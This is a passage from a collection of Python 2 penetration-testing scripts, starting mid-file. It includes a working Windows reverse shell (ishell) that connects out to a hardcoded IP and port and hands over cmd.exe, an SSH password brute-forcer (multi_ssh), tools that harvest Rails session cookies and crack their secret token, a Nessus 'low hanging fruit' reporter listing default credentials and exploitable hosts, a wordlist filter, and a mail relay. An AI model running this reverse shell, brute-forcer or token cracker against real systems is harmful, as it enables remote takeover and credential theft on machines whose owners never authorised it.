#-----------------------------------------------------------------------------

#
# Parse command line arguments using argparse
#
if len(sys.argv) != 2:
    print 'Usage: gravatar.py email_file'
    sys.exit(1)

email_file = sys.argv[1]

profiles = []
with open(sys.argv[1]) as emails:
    for email in emails:
        email = email.rstrip('\r\n')
        profile = get_profile(email)
        if profile != []:
            profiles.append(profile)

for profile in profiles:
    print_profile(profile)

########NEW FILE########
__FILENAME__ = ishell
#!/usr/bin/env python
# Copyright (c) 2012, AverageSecurityGuy
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification, 
# are permitted provided that the following conditions are met:
#
#  Redistributions of source code must retain the above copyright notice, this 
#  list of conditions and the following disclaimer.
#
#  Redistributions in binary form must reproduce the above copyright notice, 
#  this list of conditions and the following disclaimer in the documentation 
#  and/or other materials provided with the distribution.
#
#  Neither the name of AverageSecurityGuy nor the names of its contributors may
#  be used to endorse or promote products derived from this software without
#  specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND 
# ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED 
# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. 
# IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, 
# INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT 
# NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, 
# OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, 
# WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) 
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY 
# OF SUCH DAMAGE.

import subprocess
import socket
import re
import sys
import argparse

HOST = '192.168.56.102'
PORT = '4445'

##############################################################################
#   Class Definitions                                                        # 
##############################################################################

class InteractiveCommand():
	""" Sets up an interactive session with a process and uses prompt to
	determine when input can be passed into the command."""
	
	def __init__(self, process, prompt):
		self.process = subprocess.Popen( process, shell=True, 
				stdin=subprocess.PIPE, stdout=subprocess.PIPE, 
				stderr=subprocess.STDOUT )
		
		self.prompt  = prompt
		self.wait_for_prompt()

	def wait_for_prompt(self):
		output = ""
		while not self.prompt.search(output):
			c = self.process.stdout.read(1)
			if c == "":	break
			output += c

		# Now we're at a prompt; return the output
		return output

	def command(self, command):
		self.process.stdin.write(command + "\n")
		return self.wait_for_prompt()


##############################################################################
#   Function Definitions                                                     # 
##############################################################################

def usage():
	print("shell.py server port")
	sys.exit()


##############################################################################
#    MAIN PROGRAM                                                            #
##############################################################################

#Parse command line arguments using argparse
parser = argparse.ArgumentParser(description="Create a reverse shell.")
parser.add_argument('-s', action='store', default=HOST, metavar='server',
                    help='IP address of server accepting reverse connection')
parser.add_argument('-p', action='store', default=PORT, metavar='port',
                    help='Listening port on server.')
args = parser.parse_args()

	
cp = InteractiveCommand("cmd.exe", re.compile(r"^C:\\.*>", re.M))

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((args.s, int(args.p)))
sock.send("[*] Connection recieved.")

while True:
	data = sock.recv(1024).strip()
	if data == 'quit': break
	res = cp.command(data)
	sock.send(res)

########NEW FILE########
__FILENAME__ = lhf
#!/usr/bin/env python
# Copyright (c) 2012, AverageSecurityGuy
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification,
# are permitted provided that the following conditions are met:
#
#  Redistributions of source code must retain the above copyright notice, this
#  list of conditions and the following disclaimer.
#
#  Redistributions in binary form must reproduce the above copyright notice,
#  this list of conditions and the following disclaimer in the documentation
#  and/or other materials provided with the distribution.
#
#  Neither the name of AverageSecurityGuy nor the names of its contributors may
#  be used to endorse or promote products derived from this software without
#  specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
# ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
# IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT,
# INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
# NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA,
# OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
# WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY
# OF SUCH DAMAGE.

import xml.etree.ElementTree
import sys
import re
import os.path

#------------------------------------
# Object to hold Nessus host items
#------------------------------------


class HostItem():

    def __init__(self, ip, fqdn, op):
        self.ip = ip
        self.fqdn = fqdn
        self.os = op
        self.tcp_ports = []
        self.udp_ports = []
        self.users = []
        self.open_shares = []
        self.web_servers = []
        self.snmp = []
        self.tomcat = []

    def name(self):
        if self.fqdn == '':
            return '{0}'.format(self.ip)
        else:
            return '{0} ({1})'.format(self.ip, self.fqdn)


class Vulnerability():

    def __init__(self, pid, name, desc):
        self.pid = pid
        self.name = name
        self.desc = desc
        self.hosts = []


def usage():
    print("lhf.py nessus_file")
    sys.exit()


##
# function to return an IP address as a tuple of ints. Used for sorting by
# IP address.
def ip_key(ip):
    return tuple(int(part) for part in ip.split('.'))


##
# Take the filename and confirm that it exists, is not empty, and is a Nessus
# file.
def open_nessus_file(filename):
    if not os.path.exists(filename):
        print("{0} does not exist.".format(filename))
        sys.exit()

    if not os.path.isfile(filename):
        print("{0} is not a file.".format(filename))
        sys.exit()

    # Load Nessus XML file into the tree and get the root element.
    nf = xml.etree.ElementTree.ElementTree(file=filename)
    root = nf.getroot()

    # Make sure this is a Nessus v2 file
    if root.tag == 'NessusClientData_v2':
        return filename, root
    else:
        print("{0} is not a Nessus version 2 file.".format(filename))
        sys.exit()


##
# Extract host properties from the host_properties XML node.
def process_host_properties(host_properties):
    ip = ''
    op = 'Unknown'
    fqdn = ''
    for tag in host_properties.findall('tag'):
        if tag.attrib['name'] == 'host-ip':
            ip = tag.text
        if tag.attrib['name'] == 'operating-system':
            op = tag.text
        if tag.attrib['name'] == 'host-fqdn':
            fqdn = tag.text

    return ip, fqdn, op


##
# Split the TCP and UDP ports into separate lists.
def process_port(hid, protocol, port):
    p = int(port)

    if protocol == 'tcp' and p != 0:
        if not p in host_items[hid].tcp_ports:
                host_items[hid].tcp_ports.append(p)

    if protocol == 'udp' and p != 0:
        if not p in host_items[hid].udp_ports:
            host_items[hid].udp_ports.append(p)


##
# Extract usernames from the plugin and add them to a user list. Create a new
# vulnerability and add the user list to the notes field.
def process_users(hid, item):
    text = item.find('plugin_output').text
    users = []
    for line in text.split('\n'):
        m = re.search(r' - (.*) \((.*)\)$', line)
        if m:
            if re.search(r'\$', m.group(1)):
                continue
            else:
                if re.search(r'id 500', m.group(2)):
                    user = "{0} (Administrator)".format(m.group(1))
                else:
                    user = m.group(1)

                users.append(user)

    note = ", ".join(users)
    add_vulnerability(hid, item, note)


##
# Extract the shared folder names from the plugin and add them to a share
# list. Create a new vulnerability and add the share list to the notes field.
# Nessus lists the shares differently for Windows, AFP and NFS, which is why
# there are two different regular expressions. NFS is the odd man out.
def process_open_shares(hid, item):
    if item.attrib['pluginID'] == '11356':
        sname = re.compile(r'^\+ (.*)$')
    else:
        sname = re.compile(r'^- (.*)$')

    text = item.find('plugin_output').text
    shares = []

    for line in text.split('\n'):
        m = sname.search(line)

        if m:
            shares.append(m.group(1))

    note = ", ".join(shares)

    add_vulnerability(hid, item, note)


##
# Extract the SNMP community names from the plugin (plugin 41028 is only for
# the public community name) and add them to a snmp list. Create a new
# vulnerability and add the snmp list to the notes field.
def process_snmp(hid, item):
    text = item.find('plugin_output').text
    snmp = []
    if plugin == '41028':
        note = 'public'
    else:
        for line in text.split('\n'):
            m = re.search(r' - (.*)$', line)
            if m:
                snmp.append(m.group(1))

        note = ", ".join(snmp)

    add_vulnerability(hid, item, note)


##
# Extract the URL and login credentials from the plugin. Create a new
# vulnerability and add the URL and credentials to the notes field.
def process_apache_tomcat(hid, item):
    text = item.find('plugin_output').text

    u = re.search(r'Username : (.*)', text).group(1)
    p = re.search(r'Password : (.*)', text).group(1)
    url = re.search(r'([http|https]://.*)', text).group(1)

    note = "URL: {0}, User: {1}, Pass: {2}".format(url, u, p)

    add_vulnerability(hid, item, note)


##
# Extract the URL and login credentials from the plugin. Create a new
# vulnerability and add the URL and credentials to the notes field.
def process_default_credentials(hid, item):
    text = item.find('plugin_output').text

    if "Account 'sa' has password" in text:
        sa = re.search(r"Account 'sa' has password '(.*)'", text).group(1)

        note = "User: sa, Pass: {0}".format(sa)

        add_vulnerability(hid, item, note)
    else:
        u = re.search(r'User.* : (.*)', text).group(1)
        p = re.search(r'Password : (.*)', text).group(1)

        note = "User: {0}, Pass: {1}".format(u, p)

        add_vulnerability(hid, item, note)


##
# Extract the web server version from the plugin. Add the IP address, port,
# and server version to the web servers list.
def process_web_server(hid, item):
    output = item.find('plugin_output').text
    port = int(item.attrib['port'])
    server = ''
    m = re.search(r'\n\n(.*?)(\n|$)', output)

    if m:
        server = m.group(1)

    if (hid, port, server) in host_items[hid].web_servers:
        pass
    else:
        host_items[hid].web_servers.append((hid, port, server))


##
# Check the vulnerability to see if there is a Metasploit plugin. If there
# is, create a new vulenrability and add the metasploit plugin name to the
# notes field.
def check_metasploit_exploit(hid, item):
    metasploit = ''
    mname = ''
    risk_factor = ''

    if not item.find('exploit_framework_metasploit') is None:
        metasploit = item.find('exploit_framework_metasploit').text
        mname = item.find('metasploit_name').text

    if not item.find('risk_factor') is None:
        risk_factor = item.find('risk_factor').text

    if metasploit == 'true':
        if not risk_factor == 'None':
            add_vulnerability(hid, item, mname)


##
# Create a new Vulnerability object and add it to the vulns dictionary.
def add_vulnerability(hid, item, note=''):
    pid = item.attrib['pluginID']
    name = item.attrib['pluginName']
    desc = item.find('description').text
    port = item.attrib['port']

    if pid in vulns.keys():
        vulns[pid].hosts.append((hid, port, note))
    else:
        vulns[pid] = Vulnerability(pid, name, desc)
        vulns[pid].hosts.append((hid, port, note))


#-------------------------#
# Begin the main program. #
#-------------------------#
host_items = {}
vulns = {}

##
# Compiled regular expressions
dc = re.compile(r'default credentials', re.I)
dt = re.compile(r'directory traversal', re.I)


##
# Process program arguments
if len(sys.argv) != 2:
    usage()

if sys.argv[1] == '-h':
    usage()
else:
    file_name, nessus = open_nessus_file(sys.argv[1])

##
# Find all the reports in the Nessus file
reports = nessus.findall('Report')

##
# Process each of the reports
for report in reports:
    report_name = report.attrib['name']
    print("Processing report {0}".format(report_name))

    # Process each host in the report
    report_hosts = report.findall('ReportHost')
    for host in report_hosts:

        hid, fqdn, op = process_host_properties(host.find('HostProperties'))

        # if hid and fqdn are empty then the host scan did not complete or
        # some other error has occured. Skip this host.
        if (hid == '') and (fqdn == ''):
            continue

        host_items[hid] = HostItem(hid, fqdn, op)

        print("Processing host {0}".format(hid))

        # Find and process all of the ReportItems
        report_items = host.findall('ReportItem')
        for item in report_items:
            process_port(hid, item.attrib['protocol'], item.attrib['port'])
            plugin = item.attrib['pluginID']
            name = item.attrib['pluginName']

            # Process user accounts
            # 10860 == local users, 10399 == domain users, 56211 == 1ocal
            if plugin == '56211' or plugin == '10860' or plugin == '10399':
                process_users(hid, item)
                continue

            # Process Open Windows Shares
            if plugin == '42411':
                process_open_shares(hid, item)
                continue

            # Process Open NFS Shares
            if plugin == '11356':
                process_open_shares(hid, item)
                continue

            # Process Open AFP Shares
            if plugin == '45380':
                process_open_shares(hid, item)
                continue

            # Process Apache Tomcat Common Credentials
            if plugin == '34970':
                process_apache_tomcat(hid, item)
                continue

            # Process SNMP Default Community Strings
            if plugin == '10264' or plugin == '41028':
                process_snmp(hid, item)
                continue

            # Process Web Servers
            if plugin == '10107':
                process_web_server(hid, item)
                continue

            if plugin == '11424':
                add_vulnerability(hid, item)
                continue

            # Default Credentials
            if dc.search(name):
                process_default_credentials(hid, item)
                continue

            # Directory Traversal
            if dt.search(name):
                add_vulnerability(hid, item)
                continue

            # HTTP Plaintext Authentication
            # Sniff plaintext auth using ettercap or Cain
            if plugin == '26194' or plugin == '34850':
                add_vulnerability(hid, item)
                continue

            # Process Vulnerabilities with a Metasploit Exploit module
            check_metasploit_exploit(hid, item)


##
# Print a report summarizing the data
t = """
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html>
<head>
<title>Low Hanging Fruit Nessus Summary</title>
<style>
body {
    margin: 0;
    padding: 0;
    text-align: center;
    font-family: Calibri, Helvetica, sans-serif;
    font-size: 10pt;
    background-color: #ffffff;
    color: #1f1f1f;
}

#container {
    margin: 16px auto;
    padding: 0;
    width: 960px;
    text-align: left;
}

#banner {
    margin 0;
    padding 0;
    background-color: #f1f1f1;
    border: 1px solid #1f1f1f;
    text-align: center;
}

#banner h1 {
    font-size: 2.75em;
    line-height: 1.5;
    color: #e40000;
    margin: 0;
    padding: 0;
}

#banner h2 {
    font-size: 1.5em;
    line-height: 1.25;
    margin: 0;
    padding: 0;
    color: #000000;
}

#menu {
    width: 100%;
    float: left;
    background-color: #ffffff;
    margin: 8px 0px;
    border-bottom: 2px solid #1f1f1f;
}

#menu ul{
    margin: 0;
    padding: 0;
}

#menu ul li {
    list-style-type: none;
    display: inline;
}

#menu a {
    display: block;
    float: left;
    padding: 4px 8px;
    color: #1f1f1f;
    font-size: 1.25em;
    text-decoration: none;
    font-weight: bold;
}

#menu a:active {
    color: #1f1f1f;
}

#menu a:visited {
    color: #1f1f1f;
}

#menu a:hover {
    color: #f40000;
}

p {
    margin: 0 0 4px 0;
    padding: 0;
}

h1 {
    margin: 24px 0 0 0;
    padding: 0;
    font-size: 1.5em;
}

h2 {
    margin: 12px 0 0 0;
    padding: 0;
    font-size: 1.25em;
    color: #e40000;
}

table { border-collapse: collapse; }
table, td, th { border: 1px solid #000000; vertical-align: top;}
th { text-align: center; background-color: #f1f1f1; }
td { padding: 0 4px 0 4px }
th#ip { width: 160px; }
th#os { width: 200px; }
th#tcp { width: 300px; }
th#udp { width: 300px; }
th#notes { width: 830px; }
</style>
</head>
<body>
<div id="container">
<a name="top"></a>
<div id="banner">
<h1>Low Hanging Fruit</h1>
"""

t += "<h2>{0}</h2>\n".format(file_name)
t += """</div>
<div id="menu">
<ul>
<li><a href="#vulns">Vulnerabilities</a></li>
<li><a href="#ports">Port List</a></li>
<li><a href="#web">Web Servers</a></li>
</ul>
</div>"""

if len(host_items) > 0:

    ##
    # Print out the list of vulnerabilities
    t += "<a name=\"vulns\"></a><h1>Vulnerabilities</h1>\n"
    t += "<a href=\"#top\">(Back to Top)</a>\n"
    if len(vulns) > 0:
        for pid in sorted(vulns.keys()):
            t += "<h2>{0}</h2>\n".format(vulns[pid].name)
            t += "<p>{0}</p>\n".format(vulns[pid].desc.replace('\n\n', '<br />'))
            t += "<p><table>\n"
            t += "<tr><th id=\"ip\">IP Address:port</th>"
            t += "<th id=\"notes\">Notes</th></tr>\n"
            for host, port, note in sorted(vulns[pid].hosts, key=lambda x: ip_key(x[0])):
                t += "<tr><td>{0}:{1}</td>".format(host, port)
                t += "<td>{0}</td></tr>\n".format(note.encode('ascii', 'replace'))
            t += "</table></p>\n"

    ##
    # Print out the port list
    t += "<a name=\"ports\"></a><h1>Port List</h1>\n"
    t += "<a href=\"#top\">(Back to Top)</a>\n"
    t += "<table>"
    t += "<tr><th id=\"ip\">IP Address (FQDN)</th><th id=\"os\">Operating System</th>"
    t += "<th id=\"tcp\">Open TCP Ports</th><th id=\"udp\">Open UDP Ports</th></tr>\n"
    for hid in sorted(host_items.keys(), key=ip_key):
        if len(host_items[hid].tcp_ports) == 0 and len(host_items[hid].udp_ports) == 0:
            continue

        t += "<tr><td>{0}</td><td>{1}</td><td>{2}</td><td>{3}</td></tr>\n".format(
            host_items[hid].name(),
            host_items[hid].os,
            ", ".join(str(x) for x in sorted(host_items[hid].tcp_ports)),
            ", ".join(str(x) for x in sorted(host_items[hid].udp_ports)))

    t += "</table>"

    ##
    # Print out the web server list
    t += "<a name=\"web\"></a><h1>Web Servers</h1>\n"
    t += "<a href=\"#top\">(Back to Top)</a>\n"
    t += "<p>\n"
    for hid in sorted(host_items.keys(), key=ip_key):

        if len(host_items[hid].web_servers) > 0:
            for host, port, server in sorted(host_items[hid].web_servers):
                if port == 443 or port == 8443:
                    prot = "https://"
                else:
                    prot = "http://"
                t += "<a href=\"{0}{1}:{2}\">{0}{1}:{2}</a> ({3})<br />\n".format(
                    prot, host, str(port), server)

    t += "</p>\n"


t += "</div>\n</body>\n</html>"

summary_file = file_name + "_summary.html"
print("Saving report to {0}".format(summary_file))
summary = open(summary_file, "w")
summary.write(t)

########NEW FILE########
__FILENAME__ = multi_ssh
import multiprocessing
import paramiko
import sys
import time
import Queue


def worker(ip, cred_queue):
    while True:
        try:
            creds = cred_queue.get(timeout=10)
        except Queue.Empty:
            return 

        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=creds[0], password=creds[1])
            print 'Success: {0} {1} {2}'.format(ip, creds[0], creds[1])
        except paramiko.AuthenticationException:
            print 'Fail: {0} {1} {2}'.format(ip, creds[0], creds[1])
        except Exception, e:
            print 'Fail: {0} {1}'.format(ip, str(e))
            cred_queue.put(creds)
            return

        time.sleep(.5)

def file_to_list(filename):
    data = []
    for line in open(filename, 'r'):
        line = line.strip()
        if line == '':
            continue
        data.append(line)
    return data

if __name__ == '__main__':
    if len(sys.argv) != 4:
        print 'Usage: multi_ssh.py server_file username_file password_file'
        sys.exit()

    servers = file_to_list(sys.argv[1])
    usernames = file_to_list(sys.argv[2])
    passwords = file_to_list(sys.argv[3])

    cred_queue = multiprocessing.Queue()
    threads = len(servers)
    procs = []

    for i in range(threads):
        p = multiprocessing.Process(target=worker,
                                    args=(servers[i], cred_queue))
        procs.append(p)
        p.start()

    for user in usernames:
        for pwd in passwords:
            cred_queue.put((user, pwd))

    # Wait for all worker processes to finish
    for p in procs:
        p.join()


########NEW FILE########
__FILENAME__ = passfilter
#!/usr/bin/env python
# Copyright (c) 2012, AverageSecurityGuy
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification, 
# are permitted provided that the following conditions are met:
#
#  Redistributions of source code must retain the above copyright notice, this 
#  list of conditions and the following disclaimer.
#
#  Redistributions in binary form must reproduce the above copyright notice, 
#  this list of conditions and the following disclaimer in the documentation 
#  and/or other materials provided with the distribution.
#
#  Neither the name of AverageSecurityGuy nor the names of its contributors may
#  be used to endorse or promote products derived from this software without
#  specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND 
# ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED 
# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. 
# IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, 
# INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT 
# NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, 
# OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, 
# WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) 
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY 
# OF SUCH DAMAGE.

import argparse
import re
import sys

#------------------------------------------------------------------------------
# Function Definitions
#------------------------------------------------------------------------------

def parse_word(word, s):
    """Parses the word and counts the number of digits, lowercase letters,
    uppercase letters, and symbols. Returns a dictionary with the results.
    If any character in the word is not in the set of digits, lowercase
    letters, uppercase letters, or symbols it is marked as a bad character.
    Words with bad characters are not output."""

    count = {'d': 0, 'l': 0, 'u': 0, 's': 0, 'x':0}
    d = '0123456789'
    l = 'abcdefghijklmnopqrstuvwxyz'
    u = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    
    for c in word:
        if c in d:
            count['d'] += 1
        elif c in l:
            count['l'] += 1
        elif c in u:
            count['u'] += 1
        elif c in s:
            count['s'] += 1
        else:
            count['x'] += 1

    return count

def parse_requirements(r):
    """Determine which characters are required and the number of them that
    are required."""
    
    req = {'d': 0, 'l': 0, 'u': 0, 's': 0}
    for c in r:
        if c == 'd':
            req['d'] += 1
        elif c == 'l':
            req['l'] += 1
        elif c == 'u':
            req['u'] += 1
        elif c == 's':
            req['s'] += 1
        else:
            continue

    return req
            
def complex_pass(count):
    """Windows complexity requires a password to contain three of the four
    groups: digits, lowercase letters, uppercase letters, or symbols."""

    if count['d'] and count['l'] and count['u']:
        return True
    elif count['d'] and count['l'] and count['s']:
        return True
    elif count['d'] and count['u'] and count['s']:
        return True
    elif count['l'] and count['u'] and count['s']:
        return True
    else:
        return False


def meets_requirements(count, r):
    """Does the password have enough of each type of character to meet the
    requirements?"""
    
    if (count['d'] >= r['d'] and count['l'] >= r['l'] and
    count['u'] >= r['u'] and count['s'] >= r['s']):
        return True
    else:
        return False

    
#------------------------------------------------------------------------------
# Main Program
#------------------------------------------------------------------------------

desc = """Passfilter.py reads a file or stdin and returns words that meet the
defined requirements. For most password policies the set of allowed letters
and numbers is the same. The set of allowed symbols varies widely between
policies. Passfilter.py defines a default set of symbols which can be
overridden using the -s flag.

Examples:
Return all words 3 to 10 characters long.
    passfilter.py -f wordlist

Return all words 3 to 10 characters long that meet the windows complexity
requirements.
    passfilter.py -w -f wordlist

Return all words 5 to 9 characters long that have at least two lowercase
letters and at least one digit.
    passfilter.py -m 5 -x 9 -r lld -f wordlist
"""

parser = argparse.ArgumentParser(prog="Passfilter.py",
                        formatter_class=argparse.RawDescriptionHelpFormatter,
                        description=desc)
group = parser.add_mutually_exclusive_group()
group.add_argument('-w', action='store_true', default=False,
                    help='Passwords must meet Windows complexity requirements.')
group.add_argument('-r', action='store', default='', metavar='string',
                    help='''String representing the character groups and count
                    required.''')
parser.add_argument('-m', action='store', type=int, default='3', metavar='min',
                    help='Minimum password length. (default: 3)')
parser.add_argument('-x', action='store', type=int, default='10', metavar='max',
                    help='Maximum password length. (default: 10)')
parser.add_argument('-s', action='store', default=''' !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~''',
                    help='''Symbols allowed in the password.
(default:  !"#$%%&'()*+,-./:;<=>?@[\]^_`{|}~)''',
                    metavar='symbols')
parser.add_argument('-f', metavar='wordlist',
                    help='Wordlist to parse (default: stdin).')

args = parser.parse_args()

# Open the file or stdin
if args.f:
    try:
        wordlist = open(args.f, 'r')
    except IOError:
        print "Could not open file %s" % args.f
        sys.exit()
else:
    wordlist = sys.stdin

for line in wordlist:

    # Skip blank lines and comments in the word list
    if re.match('^$', line):
        continue
    if re.match('^#.*$', line):
        continue

    # Strip the new line character and check the word for length requirements
    word = line.rstrip('\r\n')
    if len(word) < args.m:
        continue
    if len(word) > args.x:
        continue

    # Count the occurrance of each type of character. 
    count = parse_word(word, args.s)

    # If any character did not match the allowed characters, skip the word
    if count['x'] > 0:
        continue

    # If requirements were provided then check to see if the word meets the
    # requirements. If it does then keep it, if not, move to the next word.
    if args.r:
        if meets_requirements(count, parse_requirements(args.r)):
            print word
            continue
        else:
            continue

    # If we require Windows complexity then check to see if the word meets the
    # windows complexity requirements. If it does then keep it, if not, move to
    # the next word.
    if args.w:
        if complex_pass(count):
            print word
            continue
        else:
            continue
        
    else:
        print word

if wordlist is not sys.stdin:
    wordlist.close()

########NEW FILE########
__FILENAME__ = rails_find
#!/usr/bin/env python
import requests
import urllib
import sys
import re
import multiprocessing
import Queue

cookie_re = re.compile(r'.*?=([0-9A-Za-z%]+)--([0-9a-f]+);')

def unquote(data):
    udata = urllib.unquote(data)
    if data == udata:
        return udata.replace('\n', '%0A')
    else:
        return unquote(udata)


def extract_session_digest(cookie):
    m = cookie_re.match(cookie)
    if m is not None:
        return unquote(m.group(1)), m.group(2)
    else:
        return None, None


def worker(url_queue, cookie_queue):
    print '[*] Starting new worker thread.'
    while True:
        # If there are no urls to access, stop the thread
        try:
            url = url_queue.get(timeout=10)
            if verbose: print '[*] Accessing {0}'.format(url)
        except Queue.Empty:
            print '[-] URL queue is empty, quitting.'
            return

        # Access the URL and process the set-cookie header value.
        try:
            resp = requests.get(url, timeout=5)
        except:
            print '[-] Could not access {0}'.format(url)
            continue

        try:
            cookie = resp.headers['set-cookie']
        except KeyError:
            cookie = None

        if cookie is not None:
            session, digest = extract_session_digest(cookie)
            if session is not None:
                print '[*] Found matching cookie for {0}.'.format(url)
                cookie_queue.put('{0}::{1}::{2}'.format(url, session, digest))


def process_file(filename):
    url_queue = multiprocessing.Queue()
    cookie_queue = multiprocessing.Queue()
    procs = []

    # Create one thread for each processor.
    for i in range(4):
        p = multiprocessing.Process(target=worker, args=(url_queue,
                                                         cookie_queue))
        procs.append(p)
        p.start()

    # Load the URLs into the queue
    for line in open(filename):
        url = 'http://' + line.rstrip('\r\n')
        url_queue.put(url)

    # Wait for all worker processes to finish
    for p in procs:
        p.join()

    # Write the cookies to a file.
    outfilename = 'results_' + filename
    outfile = open(outfilename, 'w')
    while not cookie_queue.empty():
        outfile.write(cookie_queue.get() + '\n')

    outfile.close()


if __name__ == '__main__':
    if len(sys.argv) != 2:
        print 'Usage: rails_find.py url_file'
        sys.exit()

    verbose = False
    filename = sys.argv[1]
    print '[*] processing file {0}'.format(filename)
    process_file(filename)
########NEW FILE########
__FILENAME__ = rails_secret_token
#!/usr/bin/env python
import sys
import hmac
import hashlib


def check_digest(session, digest, key):
    h = hmac.new(key, session, hashlib.sha1)
    if h.hexdigest() == digest:
        return key
    else:
        return None

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print 'Usage: rails_secret_key cookie_file key_file'
        sys.exit()

    for line in open(sys.argv[1]):
        line = line.rstrip('\r\n')
        url, session, digest = line.split('::')
        session = session.replace('%0A', '\n')

        for line in open(sys.argv[2]):
            key = line.rstrip('\r\n')
            if check_digest(session, digest, key) is not None:
                print 'Found secret_token for {0}: {1}'.format(url, key)
########NEW FILE########
__FILENAME__ = servers_to_burp
import requests
import sys


PROXIES = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}


if __name__ == '__main__':
    if len(sys.argv) != 2:
        print 'USAGE: find_web_servers.py hostfile'
        sys.exit()

    for url in open(sys.argv[1]):
        resp = requests.get(url, timeout=15, proxies=PROXIES, verify=False)

########NEW FILE########
__FILENAME__ = setmail
#!/usr/bin/env python
# Copyright (c) 2012, AverageSecurityGuy
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification, 
# are permitted provided that the following conditions are met:
#
#  Redistributions of source code must retain the above copyright notice, this 
#  list of conditions and the following disclaimer.
#
#  Redistributions in binary form must reproduce the above copyright notice, 
#  this list of conditions and the following disclaimer in the documentation 
#  and/or other materials provided with the distribution.
#
#  Neither the name of AverageSecurityGuy nor the names of its contributors may
#  be used to endorse or promote products derived from this software without
#  specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND 
# ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED 
# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. 
# IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, 
# INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT 
# NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, 
# OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, 
# WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) 
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY 
# OF SUCH DAMAGE.

import smtpd
import smtplib
import asyncore
import dns.resolver

port = 2525
debug = False

def get_mx_record(domain):
    records = dns.resolver.query(domain, 'MX')
    return str(records[0].exchange)

class CustomSMTPServer(smtpd.SMTPServer):
    
    def process_message(self, peer, mailfrom, rcpttos, data):
        for rcptto in rcpttos:
            domain = rcptto.split('@')[1]
            print domain
            mx = get_mx_record(domain)
            print mx
            server = smtplib.SMTP(mx, 25)
            if debug:
                server.set_debuglevel(True)
            try:
                server.sendmail(mailfrom, rcptto, data)
            finally:
                server.quit()

server = CustomSMTPServer(('127.0.0.1', port), None)
print 'Server listening on port {0}'.format(port)
